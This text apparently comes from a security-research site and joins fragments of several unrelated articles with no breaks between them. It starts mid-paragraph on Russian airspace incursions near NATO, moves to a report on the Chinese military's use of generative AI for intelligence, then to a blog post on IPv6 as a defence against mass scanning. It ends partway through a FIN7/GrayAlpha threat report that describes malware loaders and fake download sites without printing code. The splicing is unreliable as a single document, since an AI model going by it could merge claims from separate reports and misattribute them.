        <p>In addition to expanding its military capabilities along NATO member state borders, Russian coercive military actions via incursions into NATO airspace will also likely increase ahead of the 2025 NATO Summit. In April 2024, the foreign ministers of Estonia, Latvia, Lithuania, Finland, and Sweden met to discuss growing global positioning system (GPS) interference in the region, which Estonian Foreign Minister Margus Tsahkna attributed to Russia and which Insikt Group assessed would continue through then-ongoing STEADFAST DEFENDER 2024 military exercises. In its annual report in May 2025, Latvia’s Military Intelligence and Security Service (MIDD) <a href="https://eng.lsm.lv/article/society/defense/06.05.2025-latvias-intelligence-service-russia-is-undergoing-military-reform.a597782/">reported</a> that Russia has increasingly been monitoring NATO activity in the Baltic Sea and engaging in acts such as unauthorized airspace violations, in a likely attempt to intimidate, test NATO responses, and discredit regional defense capabilities.</p>

        </p>
        <h2>Executive Summary</h2>
        <p>The People’s Liberation Army (PLA) has demonstrated clear interest in using generative artificial intelligence (AI) to support intelligence work, has designed methods and systems that apply generative AI to intelligence tasks, and has likely procured generative AI for intelligence purposes. Both the PLA and China’s defense industry have very likely adapted foreign and domestic large language models (LLMs) to develop specialized models that can effectively carry out intelligence tasks. The PLA and China’s defense industry have created generative AI-based intelligence tools that can reportedly process and analyze intelligence data, generate intelligence products, answer questions, provide recommendations, facilitate early warning, and support decision-making, among other functions. These tools are broadly intended to improve the speed, efficiency, accuracy, and scale of intelligence tasks while reducing costs. Though elements of the PLA have expressed optimism about the benefits of generative AI and are likely taking initial steps to apply this technology to intelligence work, the PLA has very likely recognized the limitations and risks of this technology. Consequently, the extent to which the PLA will integrate generative AI into intelligence activities — and the ultimate effectiveness of this integration — remains unclear.</p>
        <p>The PLA’s interest in using generative AI to support military intelligence presents challenges for both the PLA and the West. For the PLA, given the limitations and risks of generative AI, successful adoption of this technology will require experimenting with the intelligence applications of generative AI, accurately assessing the outcomes of these experiments, and appropriately applying generative AI to intelligence work based on these outcomes and assessments; failure to do so could result in inaccurate intelligence that degrades the quality of decision-making. Moreover, if PLA intelligence analysts use generative AI models that were developed to conform with Chinese Communist Party (CCP) ideology or trained on ideologically biased analytical products, the PLA risks reducing the objectivity of intelligence analysis. For the West, the PLA’s application of generative AI to intelligence work creates technology transfer challenges and highlights the risk of Chinese counterintelligence organizations using generative AI to generate inauthentic but convincing information to mislead Western intelligence analysts and degrade the intelligence value of open-source information.</p>
        <h2>Key Findings</h2>
        <ul>
          <li>PLA media and researchers affiliated with the PLA have argued that the application of generative AI to military intelligence has a wide range of potential benefits, including improving the collection and analysis of intelligence and providing enhanced decision-making capabilities to military commanders, but have also recognized various challenges and risks associated with using this technology for intelligence work.</li>
          <li>Likely realizing the intelligence limitations of general-purpose generative AI models, the PLA and China’s defense industry are likely prioritizing the development and use of specialized models that have been fine-tuned for intelligence tasks.</li>
          <li>The PLA and China’s defense industry have very likely used a mix of proprietary and open-source LLMs from foreign and domestic developers to create generative AI-based intelligence tools. Foreign LLMs used this way very likely include models from Meta, OpenAI, and BigScience, among others, while domestic LLMs very likely include models from DeepSeek, Tsinghua University, Zhipu AI, and Alibaba Cloud, among others.</li>
          <li>PLA patent applications reveal that the PLA has designed methods and systems that use generative AI to facilitate intelligence tasks such as generating open-source intelligence (OSINT) products, processing satellite imagery, supporting event extraction, and processing event data.</li>
          <li>In a patent application filed in December 2024, a Chinese state-owned defense industry research institute proposed using OSINT, human intelligence (HUMINT), signals intelligence (SIGINT), geospatial intelligence (GEOINT), and technical intelligence (TECHINT) data to train a military LLM to specialize in intelligence tasks, purportedly enabling the enhanced military LLM to support every phase of the intelligence cycle and improve decision-making during military operations.</li>
          <li>The PLA and China’s defense industry have likely procured generative AI technology to support OSINT and science and technology (S&amp;T) intelligence, an indicator that at least some elements of China’s military are likely beginning to apply generative AI to intelligence tasks.</li>
          <li>The PLA — which very likely rapidly adopted DeepSeek’s generative AI models in early 2025 — is likely using DeepSeek’s LLMs for intelligence purposes, based on claims by a Chinese defense contractor that it has provided a DeepSeek-based OSINT model to the PLA.</li>
          <li>The PLA is likely concerned that foreign counterintelligence organizations could use generative AI to produce convincing inauthentic content to mislead Chinese intelligence personnel and degrade the intelligence value of open-source information. Chinese counterintelligence organizations could apply generative AI in a similar manner.</li>
        </ul>
        <h2>Methodology</h2>
        <p>To assess the PLA’s views on and application of generative AI in intelligence work, Insikt Group collected and analyzed articles published in PLA media, academic research authored by PLA personnel, PLA and Chinese defense industry patent applications, PLA and Chinese defense industry procurement records, information published by Chinese defense contractors, and data available in the Recorded Future® Platform, among other sources. The sources cited in the report do not necessarily represent official PLA policies related to generative AI; rather, they demonstrate how individuals and organizations situated within the PLA and China’s defense industry are likely exploring and developing the intelligence applications of generative AI. This report does not assess the veracity of technical claims from the PLA and China’s defense industry, but entities that develop or sell intelligence-related generative AI tools likely have an incentive to exaggerate the effectiveness of generative AI and downplay its deficiencies, so information provided by these entities should be viewed with skepticism.</p>
        <p>Generative AI is a broad term, and some of its subcategories lack clear boundaries, which occasionally created challenges for this investigation. In some instances, we observed references to generative AI models like LLMs being used for possible non-generative functions; we assessed these references were still relevant to our investigation. Moreover, Chinese sources frequently use the term “large model” (大模型) when discussing AI models rather than more specific terms like “LLM.” Not all large models are considered to be generative AI, so we did not automatically assume that every reference to a “large model” was related to generative AI. We only classified a reference to a “large model” as generative AI when other information confirmed the model’s generative nature. <strong>Appendix A</strong> provides a glossary of generative AI terminology for readers unfamiliar with this technology.</p>
        <h2>Views on Generative AI in Military Intelligence</h2>
        <h3>PLA Daily</h3>
        <p>The PLA’s official paper, PLA Daily, has published a handful of articles that directly discuss the intelligence implications of generative AI, which are summarized in <strong>Table 1</strong>. These articles discuss the potential benefits of generative AI for military intelligence, highlighting the supposed ability of this technology to generate intelligence products, predict changes on the battlefield, facilitate intelligence activities during both peacetime and wartime, improve the efficiency of intelligence analysis, and provide decision-making support to commanders. These articles also note potential challenges associated with generative AI, suggesting that generative AI models cannot replace up-to-date intelligence and warning that the intelligence agencies of competing countries could exploit deepfakes to interfere with rival agencies.</p>

          <div>
            <div>August 2024</div>
            <div>PLA Daily published an article on large generative AI models in operational command and control, which contends that large models can generate intelligence briefs, extract intelligence main points, and predict changes in the battlefield situation. However, the article also suggests that large models cannot replace up-to-date intelligence information, arguing that these models can function as encyclopedias but can only query information from their training data. As such, large models reportedly depend on up-to-date intelligence information to analyze and judge the battlefield situation, organize and integrate intelligence products, and connect and mine intelligence knowledge.</div>
          </div>
          <div>
            <div>April 2023</div>
            <div>PLA Daily published an article on the military applications of ChatGPT, which describes ChatGPT as having intelligence applications in both peacetime and wartime. In peacetime, ChatGPT can reportedly serve as a virtual assistant to help analysts analyze the massive amount of information available on the internet, improving the efficiency of analysis and mining hidden high-value intelligence. In wartime, ChatGPT can reportedly integrate large amounts of battlefield intelligence into a comprehensive battlefield situation report automatically, reducing the workload of intelligence personnel and improving the intelligence analysis and planning capabilities of combat personnel.</div>
          </div>
          <div>
            <div>March 2023</div>
            <div>PLA Daily published an article on ChatGPT that predicts combatants will have strong intelligence collection capabilities and near-real-time information perception capabilities in “future informatized and intelligentized wars.” To this point, the article notes that ChatGPT could be used for basic work such as data analysis, decision-making support, and natural language processing, qualitatively improving commanders’ decision-making capabilities through mass battlefield information processing.</div>

            <div>June 2020</div>
            <div>The PLA Daily published an article on the dangers of deepfake technology that warns deepfakes could be used to interfere with intelligence work. The article warns that the intelligence agencies of competing countries could use deepfakes to interfere with rival agencies and set limits on the scope of their operations.</div>

        <p><strong><em>Table 1:</em></strong> <em>Summary of PLA Daily articles that discuss the intelligence implications of generative AI (Source: PLA Daily; Insikt Group)</em></p>
        <h3>Academic Research</h3>
        <p>PLA researchers — especially personnel affiliated with the Academy of Military Science (AMS; 军事科学院) Military Science Information Research Center (MSIRC; 军事科学信息研究中心) — have expressed optimism about the intelligence applications of generative AI but have also recognized the fallibility of this technology, raising a variety of issues associated with applying generative AI to intelligence work. In one notable study, AMS MSIRC researchers assessed the opportunities and challenges of using generative AI to support national defense S&amp;T intelligence, providing recommendations related to taking advantage of generative AI’s opportunities while mitigating its challenges. PLA researchers have also analyzed efforts within the United States (US) military to apply generative AI to intelligence tasks, likely aiming to learn from the US military’s experience and adapt best practices. Researchers not affiliated with the PLA but associated with other elements of China’s party-state system have likewise published on the intelligence implications of generative AI, reflecting sentiments expressed by PLA personnel and providing insight into debates likely occurring within China’s party-state system.</p>
        <h4>General Views in the PLA</h4>
        <p>PLA researchers have expressed interest in the intelligence applications of generative AI, with some describing it as a potentially transformative technology. For example, in August 2024, researchers affiliated with the AMS MSIRC published an article about the effects of AI on intelligence research that contends the development of technologies like machine learning, deep learning, and generative AI has created unprecedented opportunities for intelligence research. In June 2024, researchers affiliated with AMS MSIRC, the AMS National Innovation Institute of Defense Technology (国防科技创新研究院), and two civilian universities published a study that details their use of Meta’s Llama 13B model to develop an LLM that specializes in military OSINT, arguing that LLMs can facilitate comprehensive and accurate intelligence support for military commanders and claiming that their LLM could support intelligence analysis, strategic planning, simulation training, and command decision-making. Similarly, in February 2024, researchers affiliated with AMS MSIRC published an article that suggests applying ChatGPT-like technologies to command and control systems could result in major improvements to intelligence capabilities.</p>
        <p>Despite recognizing possible applications of generative AI for artificial intelligence, PLA researchers have also discussed challenges associated with this technology. In the aforementioned February 2024 article, AMS MSIRC researchers warn that the intelligence limits of ChatGPT-like technologies integrated into command and control systems could result in catastrophic consequences. Likewise, in the June 2024 article, AMS and civilian university personnel contend that current LLMs have serious hallucination issues and are unsuitable for direct use in OSINT. In September 2024, researchers affiliated with the PLA National University of Defense Technology’s (NUDT; 中国人民解放军国防科技大学) College of Information and Communications (信息通信学院) and College of Intelligent Science (智能科学学院) published an article about the the relationship between AI and OSINT that argues deepfakes produced with generative AI create significant challenges for efforts to exploit the massive amount of information available on the internet for intelligence purposes.</p>
        <h4>National Defense S&amp;T Intelligence Example</h4>

          </div>
        </div>
        <p>In November 2023, researchers affiliated with AMS MSIRC published an article about the potential opportunities and challenges of using generative AI for national defense S&amp;T intelligence. According to the article, traditional approaches to intelligence can no longer identify potential threats and opportunities in a timely and accurate manner, a common view that has almost certainly driven the adoption of new intelligence collection, processing, and analysis technologies within the PLA and China’s defense industry. The authors contend that generative AI is profoundly affecting the creation and application of knowledge, including national defense S&amp;T intelligence. They claim that generative AI has the potential to improve intelligence collection, evaluation, analysis, and generation (see <strong>Figure 1</strong>), detailing how generative AI could assist intelligence personnel rather than asserting that this technology could replace intelligence personnel. For example, the authors argue that generative AI could:</p>
        <ul>
          <li>Help intelligence personnel familiarize themselves with unfamiliar technical fields when assigned new intelligence tasks, thereby improving the depth and scope of analysts’ understanding of intelligence targets</li>
          <li>Aid intelligence personnel in refining and discovering relationships within large amounts of data and assist personnel with tasks like comparison, inference, providing examples, and induction</li>
          <li>Generate diverse scenarios and assumptions to help intelligence analysts broaden their thinking and avoid cognitive biases during intelligence analysis, as well as evaluate analysts’ analytical conclusions to identify potential biases</li>
          <li>Automatically recommend relevant images and audiovisual materials, generate statistical reports, and automatically synthesize relevant materials to facilitate diversified expression of intelligence analysis content beyond traditional intelligence reports</li>
        </ul>
        <p>However, they also warn that generative AI could bring unprecedented uncontrollability, uncertainty, and high levels of risk to national defense S&amp;T intelligence. They identify specific challenges such as:</p>
        <ul>
          <li>Heightened counterintelligence risks, including the risk of technological competitors using generative AI to create fake technical documents and deepfakes to mislead national defense S&amp;T intelligence efforts</li>
          <li>A lack of LLMs specifically designed for national defense S&amp;T intelligence</li>
          <li>Generative AI’s limited ability to deal with uncertain and biased information</li>
          <li>Insufficient national defense S&amp;T intelligence corpora for training LLMs, including difficulties associated with using state secrets and sensitive intelligence to train LLMs</li>
          <li>Reliability issues like “data leakage, algorithmic black boxes, value bias, and unexplainability”</li>
        </ul>
        <p>Describing generative AI as a double-edged sword, the AMS researchers suggest that the field of national defense S&amp;T intelligence should pursue measures to simultaneously take advantage of the opportunities of generative AI and mitigate its challenges. These include:</p>
        <ul>
          <li>Gradually introducing generative AI into national defense S&amp;T intelligence work and evaluating the effectiveness of this technology after its introduction</li>
          <li>Working to improve relevant corpora and LLMs</li>
          <li>Iteratively combining intelligence workflows that involve both human and generative AI inputs to ensure reliable and credible results</li>
          <li>Developing technologies to ensure the traceability and verify the reliability of AI-generated content</li>
        </ul>
        <h4>Interest in US Military Applications</h4>
        <p>PLA researchers have assessed how the US military is applying generative AI to intelligence tasks, likely aiming to learn from the US military’s experience in a manner resembling China’s previous efforts to study OSINT practices and AI military applications in the US. For example, in May 2024, a researcher affiliated with the AMS War Research Institute (战争研究院) published an article analyzing how the US is exploring the military applications of generative AI. The author discusses organizational changes, policy guidance, experimental testing, and security measures the US has reportedly implemented; particular military applications the US has reportedly conceptualized, tested, or put into use; and challenges the US has reportedly encountered. Notably, the author claims that the Defense Innovation Unit (DIU) of the US Department of Defense (DoD) initiated a technology program in May 2023 to explore the applications of generative AI in OSINT collection and analysis. This technology reportedly facilitated automatic data mining and evaluation, and visualized the battlefield information environment for commanders. The author highlights that DIU required this technology to help analysts edit and disseminate content, comply with DIU’s AI standards, and be usable within the DoD’s information environment.</p>
        <h4>Non-PLA Perspectives</h4>
        <p>Beyond the PLA, specialists situated within other segments of China’s party-state system have also examined the opportunities and challenges of using generative AI for intelligence work. Though these discussions do not focus on military intelligence, they can still provide insight into how the broader party-state system is likely grappling with the intelligence implications of this technology. For example, in November 2024, researchers affiliated with the People’s Public Security University of China (PPUSC) School of State Security (中国人民公安大学国家安全学院) published an article that highlights the risk of “false information pollution” — online disinformation created by generative AI — disrupting OSINT work. Moreover, in a June 2024 article that focuses on the potential effect of ChatGPT and other similar AI tools on intelligence work, researchers affiliated with the PPUSC Public Security Intelligence Research Center (中国人民公安大学公安情报研究中心) argue that careless use of ChatGPT could undermine the CCP’s ideological leadership of intelligence work. The researchers remind readers that ChatGPT was developed by a US company and was largely trained with an English-language corpus. They warn that ChatGPT could be affected by “Western capitalist values,” generate false but convincing information based on “neoliberalism” and “ideological neutrality,” erode ideological discourse and management, and facilitate the invisible penetration of ideology into intelligence work. The views expressed in this article coincide with Chinese regulators’ broader efforts to ensure the correct ideological alignment of generative AI models.</p>

        <h2>AI Hackathons and the Future of Security Architecture</h2>
        <p>Last week, a few <a href="/work-with-us">Futurists</a> met up to work out the practical realities of AI-enabled Red Teaming (among other topics). In addition to two days of phenomenal vibe coding in <a href="https://www.cursor.com/">Cursor</a>, the final presentations were light on hyperbole and heavy on capabilities and remarkable outcomes, created in a day or less. Two years ago, when LLMs made their mainstream debut, I was dubious, but the hackathon confirmed recent observations (last three months) that AI is accelerating security workflows (like everything else) at warp speed. Change, soon driven primarily through various agentic flavors, is happening at a pace that is difficult to comprehend.</p>
        <p>The flight home was spent considering how to get ahead of the adversarial/defensive agent wars that will soon play out across the internet. Given the vast amount of uncertainty in agentic implementations and scale, there are no perfect solutions, but there are architecture scenarios worth considering NOW. Principal among them is <a href="https://networklessons.com/ipv6/introduction-to-ipv6">IPv6</a>. Long a headache for architects and engineers (nibble boundaries anyone?), IPv6 may now represent real business value through security, in exchange for the considerable effort. AI is a natural forcing function here. Given the time required to implement IPv6 and resolve the inevitable challenges along the way, enterprises should begin the work, aided by AI, of course.</p>
        <h2>Why IPv6 Belongs in Your Five-Year Security Roadmap</h2>
        <p>What if eliminating opportunistic attacks required nothing more than updating your network architecture? The vast IPv6 address space transforms internet-wide scanning from trivial to computationally impossible, removing one critical leg from the attacker's operational stool.</p>
        <p>Modern adversaries operate on economics: maximum victims, minimum effort. <strong>IPv6's</strong> <strong><a href="https://www.techtarget.com/whatis/feature/IPv6-addresses-how-many-is-that-in-numbers">340 undecillion addresses</a></strong> create an insurmountable barrier for brute-force discovery and enumeration, forcing attackers to abandon cheap, scalable tactics. Organizations dismissing this advantage miss a critical opportunity to reduce their attack surface while security teams fight multi-front battles against AI-powered threats.</p>
        <h2>The Opportunistic Threat Reality</h2>
        <p>Recorded Future tracks thousands of automated exploitation campaigns daily, following a predictable pattern. Vulnerability disclosure triggers mass scanning within hours, leading to indiscriminate compromise of exposed systems.</p>
        <p>Recent campaigns demonstrate the scale:</p>
        <ul>
          <li><a href="https://onapsis.com/blog/active-exploitation-of-sap-vulnerability-cve-2025-31324/">CVE-2025-31324 (SAP NetWeaver)</a>: 581 systems compromised via mass scanning; 1,800+ targets identified</li>
          <li><a href="https://censys.com/advisory/cve-2024-3400">CVE-2024-3400 (PAN-OS)</a>: thousands of compromised devices in 72 hours</li>
          <li><a href="https://www.picussecurity.com/resource/blog/cve-2023-4966-lockbit-exploits-citrix-bleed-in-ransomware-attacks">CVE-2023-4966 (CitrixBleed)</a>: Over 20,000 servers breached via automated scanning</li>
          <li><a href="https://www.rapid7.com/blog/post/2023/06/01/rapid7-observed-exploitation-of-critical-moveit-transfer-vulnerability/">CVE-2023-34362 (MOVEit Transfer)</a>: 2500 instances exposed to the internet; initial access through internet-wide vulnerability discovery</li>
        </ul>
        <p>The volume metrics paint a sobering picture. <a href="https://us.norton.com/blog/emerging-threats/cybersecurity-statistics">IoT devices are attacked within 5 minutes</a> of connecting to the internet. Internet “background noise” includes 4.2 billion simultaneous events (five years ago). <a href="/podcast-episode-126">152 billion scan probes</a> are sent across the IPv4 internet daily, including <a href="https://us.norton.com/blog/emerging-threats/cybersecurity-statistics">36,000 automated scans per second</a>.</p>

        <h2>The Three-Legged Stool of Modern Remote Attacks</h2>
        <p>Threat actors balance operations on three critical foundations. Remove any leg, and its operational efficiency collapses.</p>
        <p><strong>Leg Alpha: Opportunistic Scanning</strong> Automated discovery exploits internet-exposed vulnerabilities at scale. IPv6 effectively saws off this leg by making comprehensive scanning computationally infeasible.</p>
        <p><strong>Leg Beta: Targeted Reconnaissance</strong> Domain enumeration, supply chain analysis, and social engineering remain unaffected. Adversaries leverage Certificate Transparency logs, passive DNS, and BGP announcements to build targeted hit lists.</p>
        <p><strong>Leg Charlie: Identity &amp; Insider Access</strong> Compromised credentials and third party breaches bypass network controls entirely. Address space complexity offers zero defense against authenticated attacks (and social engineering, which is a fourth leg).</p>
        <h2>Reality Check: IPv6 Security Benefits</h2>
        <p>The security community debates IPv6's defensive value, but data supports nuanced conclusions. Brute-force scanning genuinely <a href="https://www.usenix.org/system/files/sec24summer-prepub-965-williams.pdf">becomes harder</a>—even the fastest academic scanners map only millions of hosts from 2^128 possibilities.</p>
        <p>However, targeted discovery remains trivial. Adversaries enumerate targets through domain names, WHOIS records, and Certificate Transparency logs. Dual-stack deployments particularly undermine benefits, as attackers simply pivot from IPv4 reconnaissance.</p>
        <p>Key defensive advantages include:</p>
        <ul>
          <li>Address space enables thousands of deception nodes</li>
          <li>Granular segmentation without NAT complexity</li>
          <li>Protocol modernization enforces TLS 1.3 and <a href="https://www.auvik.com/franklyit/blog/what-is-quic-protocol/">QUIC</a></li>
          <li>Moving-target defense becomes economically viable</li>
        </ul>
        <h2>Practical Implementation Architecture</h2>
        <p>Organizations should maximize IPv6's defensive advantages while acknowledging its limitations. The evidence-based approach spans three phases over 24 months.</p>
        <p><strong>Phase Alpha: Foundation (Months 0-6)</strong> Deploy dual-stack architecture with IPv6-preferred public services. Implement strict ICMPv6 filtering, unpredictable address allocation, and comprehensive connection monitoring. Every IPv6 probe becomes a high-value threat signal.</p>
        <p><strong>Phase Beta: Segmentation (Months 6-12)</strong> Allocate /64 subnets per application tier with host-based microsegmentation. Deploy source address validation at edge routers and create honeypot networks throughout unused address space.</p>
        <p><strong>Phase Gamma: Advanced Defense (Months 12-24)</strong> Enable rapid address rotation for moving-target defense. Deploy IPv6-only management interfaces behind Single Packet Authorization, integrate telemetry into threat-hunting platforms, and participate in collaborative intelligence sharing.</p>

        <h2>Measuring Risk Reduction</h2>
        <p>IPv6 deployment will deliver a significant drop in scanning, and additional canary hosts/services will help create metrics that translate to increased operational efficiency. Security teams spend less time chasing automated noise, focusing instead on sophisticated threats that matter.</p>
        <h2>Future-Proofing Against AI-Powered Attacks</h2>
        <p>The next five years demand strategies that counter automated exploitation at machine speed. IPv6 enables several critical defensive patterns that become essential as AI agents weaponize vulnerabilities within minutes.</p>
        <p><strong>Autonomous Defense Pipelines:</strong> Integrate CVE feeds with LLM agents that generate patches faster than attackers can weaponize exploits. Deploy eBPF-based sidecars ingesting real-time signatures, pushing rules globally via service mesh.</p>
        <p><strong>Zero-Exposure Architecture:</strong> Hide services behind cryptographic authentication using Single Packet Authorization or modern <a href="https://blogs.infoblox.com/ipv6-coe/ipv6-enhances-zero-trust-network-architectures/">ZTNA</a>. Removes targets from the attack graph entirely—zero exposed surface equals zero remote exploitation (in theory).</p>
        <p><strong>Continuous Surface Mutation:</strong> Leverage abundant IPv6 space for constant re-addressing and port shuffling. Combined with binary diversification and container re-imaging, force adversaries to continuously rediscover targets.</p>
        <h2>Strategic Recommendations</h2>
        <p>Security leaders planning 2025-2030 roadmaps should consider adopting this blueprint:</p>
        <ol>
          <li>Deploy IPv6-only for public services where feasible</li>
          <li>Publish no AAAA DNS records for management interfaces</li>
          <li>Automate defensive kill-chains matching attacker speed</li>
          <li>Implement moving-target techniques using address abundance</li>
          <li>Shift to memory-safe languages, eliminating bug classes</li>
          <li>Treat every /64 scan as suspicious intelligence</li>
          <li>Share sanitized samples with collaborative defense communities</li>
        </ol>
        <h2>The Bottom Line</h2>
        <p>IPv6 won't stop nation-states or targeted ransomware groups, but it eliminates <a href="https://www.researchgate.net/publication/262351991_Understanding_IPv6_Internet_background_radiation">the background radiation</a> consuming security resources. Opportunistic campaigns that compromise thousands of organizations simply cannot operate efficiently in IPv6's vast address space.</p>
        <p>Smart organizations recognize that removing entire attack classes beats chasing perfect security. IPv6 takes mass scanning off the table, forcing adversaries to reveal themselves through targeted activity. In an era where defensive teams need every advantage, that's one less leg supporting the attacker's operational model—and one more reason IPv6 belongs in your security roadmap.</p>

            <description><![CDATA[Insikt Group exposes GrayAlpha’s evolving infrastructure and infection methods—including PowerNet and MaskBat loaders, fake 7-Zip sites, and the undocumented TAG-124 network—linking the group to FIN7’s advanced cybercriminal operations.]]></description>

        <p>
          <img loading="lazy" alt="insikt group logo" src="https://www.recordedfuture.com/media_17759d8b91bf0c9106a0fa82007bef7e3316158b4.png?width=750&amp;format=png&amp;optimize=medium" width="300" height="48" />
        </p>
        <h2>Executive Summary</h2>
        <p>Insikt Group identified new infrastructure associated with GrayAlpha, a threat actor that overlaps with the financially motivated group commonly referred to as FIN7. This newly identified infrastructure includes domains used for payload distribution and additional IP addresses believed to be tied to GrayAlpha. Insikt Group discovered a custom PowerShell loader named PowerNet, which decompresses and executes NetSupport RAT. Insikt Group identified another custom loader, referred to as MaskBat, that has similarities to FakeBat but is obfuscated and contains strings linked to GrayAlpha. Overall, Insikt Group found three primary infection methods: fake browser update pages, fake 7-Zip download sites, and the traffic distribution system (TDS) TAG-124. Notably, the use of TAG-124 had not been publicly documented prior to this report. Although all three infection vectors were observed being used simultaneously, only the fake 7-Zip download pages were still active at the time of writing, with newly registered domains appearing as recently as April 2025. Further analysis of these sites led to the identification of an individual who may be involved in the GrayAlpha operation.</p>
        <p>In the near term, defenders are advised to enforce application allow-lists to block the download of seemingly legitimate files that contain malware. Where allow-lists are not practical, comprehensive employee security training becomes essential, particularly in recognizing suspicious behaviors such as unexpected prompts for browser updates or redirects caused by malvertising. Additionally, the use of detection rules, such as the YARA rules and Malware Intelligence Hunting queries provided in this report, is critical for identifying both existing and past infections. These rules should be updated frequently and supported with broader detection techniques, including monitoring of network artifacts and using Recorded Future Network Intelligence, due to the constantly evolving nature of malware.</p>
        <p>Looking ahead, defenders must monitor the broader cybercriminal ecosystem to anticipate and respond to emerging threats more effectively. The continued professionalization of cybercrime increases the likelihood of organizations across multiple industries being targeted. This trend is driven by the sustained profitability of cybercrime, limited international law enforcement collaboration, and the continuous evolution of security technologies, which in turn drive innovation among threat actors. While advanced persistent threat (APT) activity is often linked to state-sponsored entities, GrayAlpha illustrates that cybercriminal groups can demonstrate a similar level of persistence. Much like the ransomware-as-a-service (RaaS) model, cybercriminals are becoming increasingly specialized and collaborative, making it imperative to adopt a comprehensive and adaptive security posture.</p>
        <h2>Key Findings</h2>
        <ul>
          <li>Insikt Group has identified new infrastructure linked to GrayAlpha — a threat actor overlapping with the group commonly known as FIN7 — including domains utilized for payload distribution and additional IP addresses believed to be part of the threat actor's infrastructure.</li>
          <li>Insikt Group has identified a new custom PowerShell loader dubbed PowerNet that decompresses and executes NetSupport RAT.</li>
          <li>Insikt Group identified another custom loader, referred to as MaskBat, which has similarities to FakeBat but is obfuscated and contains strings linked to GrayAlpha.</li>
          <li>Insikt Group identified three main infection vectors associated with GrayAlpha: fake browser update pages, fake 7-Zip download sites, and the TDS TAG-124 network. Notably, the use of the TDS TAG-124 delivery mechanism had not been publicly documented prior to this report.</li>
          <li>While all three infection methods were employed simultaneously, only the fake 7-Zip download pages appear to remain active at the time of writing, with the most recent domains surfacing as recently as April 2025.</li>
          <li>Through the analysis of the 7-Zip pages, Insikt Group identified an individual who may be connected to the GrayAlpha operation.</li>
        </ul>
        <h2>Background</h2>
        <p>GrayAlpha is a threat actor cluster that overlaps with the financially motivated cybercriminal group commonly known as FIN7, sharing key infrastructure, tooling, and tradecraft.</p>
        <p>FIN7 has been active since at least 2013 and is considered one of the most prolific and technically sophisticated cybercriminal groups targeting organizations worldwide. The group is organized like a professional business, with compartmentalized teams handling malware development, phishing operations, money laundering, and management. FIN7 is primarily known for financially motivated <a href="https://www.fbi.gov/contact-us/field-offices/seattle/news/stories/how-cyber-crime-group-fin7-attacked-and-stole-data-from-hundreds-of-us-companies">campaigns</a> involving the theft of payment card data and unauthorized access to corporate networks, particularly within the retail, hospitality, and financial sectors.</p>
        <p>In 2018, the US Department of Justice (US DOJ) <a href="https://www.justice.gov/archives/opa/pr/three-members-notorious-international-cybercrime-group-fin7-custody-role-attacking-over-100">unsealed</a> indictments against three high-ranking FIN7 members — Dmytro Fedorov, Fedir Hladyr, and Andrii Kolpakov — highlighting the group’s extensive operations against businesses across 47 US states and multiple countries. Operating under the name of a sham cybersecurity firm, “Combi Security,” FIN7 leveraged social engineering and customized malware, including variants of Carbanak, the group’s in-house developed backdoor, to compromise thousands of point-of-sale systems and exfiltrate over 15 million payment card records. The US DOJ prosecutions revealed the group’s hierarchical command structure, with members fulfilling defined roles in intrusion operations, malware administration, and logistical coordination. Despite the disruption to its leadership, FIN7’s underlying infrastructure and tradecraft persisted, enabling the broader criminal enterprise to <a href="https://krebsonsecurity.com/2024/07/the-stark-truth-behind-the-resurgence-of-russias-fin7/">continue</a> targeting global organizations.</p>
        <p>FIN7 uses a range of custom and repurposed malware and tooling to support its operations. The group typically gains initial access through spearphishing emails containing malicious attachments or links hosted on compromised sites, often combined with callback phishing to increase credibility. FIN7’s early operations leveraged its then-proprietary Carbanak backdoor as the primary command-and-control framework, enabling the group to manage compromised hosts and coordinate post-compromise activity. POWERTRASH — a uniquely obfuscated, PowerShell-based, in-memory loader adapted from the PowerSploit framework — has also been a consistent feature of FIN7 intrusions, used to deploy payloads such as DiceLoader and cracked Core Impact implants to support exploitation, lateral movement, and persistence. FIN7 also developed AuKill (also known as AvNeutralizer), a custom EDR evasion utility designed to disable endpoint security solutions, which was later <a href="https://www.bleepingcomputer.com/news/security/notorious-fin7-hackers-sell-edr-killer-to-other-threat-actors/">reported</a> to have been offered for sale by the group on criminal marketplaces. In its most recent campaigns, FIN7 has been observed deploying the Python-based Anubis backdoor, which provides full system control via in-memory execution and communicates with its command-and-control infrastructure using Base64-encoded data.</p>
        <p>In 2023, FIN7 <a href="https://therecord.media/researchers-tie-fin7-cybercrime-family-to-clop-ransomware-microsoft">expanded</a> its operations to include the deployment of ransomware through affiliations with RaaS groups such as REvil and Maze, while also managing its own RaaS programs, including the now-retired Darkside and BlackMatter. More recently, FIN7 has been observed leveraging NetSupport RAT embedded within malicious MSIX application packages, delivered via fake update sites and malvertising.</p>
        <h2>Threat Analysis</h2>
        <h3>Infection Vectors</h3>
        <p>Over the past year, Insikt Group has identified three distinct infection vectors associated with GrayAlpha, observed during overlapping timeframes, and all ultimately resulting in NetSupport RAT infections. These vectors include:</p>
        <ul>
          <li><strong>Infection Vector 1:</strong> Fake software updates impersonating legitimate products such as Concur</li>
          <li><strong>Infection Vector 2:</strong> Malicious 7-Zip download pages</li>
          <li><strong>Infection Vector 3:</strong> Use of the TAG-124 TDS</li>
        </ul>
        <p>In these campaigns, GrayAlpha employed two primary types of PowerShell loaders: a self-contained custom script known as PowerNet, and a dynamic loader — a customized variant of FakeBat — referred to as MaskBat (see <strong>Figure 1</strong>).</p>

        </div>
        <h3>Infection Vector 1: Fake Browser Updates</h3>
        <h4>Infrastructure Analysis</h4>
        <p>Since at least April 2024, GrayAlpha has been observed leveraging fake browser update websites as part of its operations. These sites impersonate a range of legitimate products and services, including Google Meet, LexisNexis, Asana, AIMP, SAP Concur, CNN, the Wall Street Journal, and Advanced IP Scanner, among others. <strong>Table 1</strong> provides a list of domains associated with Infection Vector 1 that were still resolving as of 2025. However, it is important to note that active domain resolution does not necessarily indicate ongoing use by threat actors; in fact, the most recently observed domain began resolving in September 2024. A comprehensive list of all domains linked to Infection Vector 1 — including those that did not resolve at any point in 2025 — can be found in <strong>Appendix A</strong>.</p>

        <p><strong><em>Table 1:</em></strong> <em>Domains linked to Infection Vector 1 still resolving as of 2025 (Source: Recorded Future)</em></p>
